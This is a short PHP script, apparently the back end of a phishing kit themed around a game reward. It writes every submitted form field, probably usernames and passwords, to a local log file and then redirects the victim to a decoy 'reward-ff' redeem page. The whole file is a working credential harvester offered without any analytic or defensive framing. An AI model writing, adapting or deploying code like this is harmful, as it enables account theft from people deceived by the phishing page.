<?php
header
('location:');
$handle=fopen("log.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:https://reward-ff.netlify.app/redeem.html");
exit;
?>
